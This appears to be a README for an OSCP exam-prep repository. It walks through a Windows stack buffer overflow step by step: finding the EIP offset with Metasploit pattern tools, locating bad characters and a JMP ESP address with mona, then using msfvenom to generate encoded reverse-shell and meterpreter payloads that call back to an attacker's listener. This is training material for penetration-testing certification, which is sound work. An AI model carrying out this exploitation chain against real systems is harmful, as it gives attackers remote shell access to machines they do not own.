# BoF4OSCP

TODO: python3 setup.py

It's gonna edit all the python scripts with your target IP and PORT

Then follow the next steps...

Make sure mona is installed:
```
!mona config -set workingfolder c:\mona
```

## 1st step : create a crash

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

```
edit offset.py with the right pattern

```
python3 offset.py
```

check on mona what is the EIP address

take the EIP address (that looks mike EIP 386F...)

## 2nd step : pattern create

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337 (EIP ADDRESS)
[*] Exact match at offset 2003
```

## 3rd step : control EIP

edit eipOverwrite.py with the correct offset

```python3 eipOverwrite.py```

check on Immunity if EIP is well overwritten with 4B4B4B

## 4th step : finding badchars

edit findingBadchars.py with the offset

```
python3 findingBadchars.py
```

right click on ESP, follow in dump

find the badchars using the following command

```
!mona compare -f c:\mona\bytearray.bin -a 005FF910(ESP ADDRESS)
```

## 5th step : find the return address 

send buffer after editing python3 findingBadchars.py
```
!mona jmp -r esp -cpb (mybadchars) "\x00\x23 etc..."
```

Take one of the adresses

## 6th step : fire up the reverse shell

We can also create encoded payloads if some sort of protections are presents
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c -b '\x00\x0a\x0d' (mybadchars)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e shikata_ga_nai -i 3 -f c -b '\x00\x0a\x0d' (mybadchars)
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -e shikata_ga_nai -i 3 -f c -b '\x00\x0a\x0d' (mybadchars)
```
edit finalBuff

setup a listener

```
python3 finalBuffer.py
```
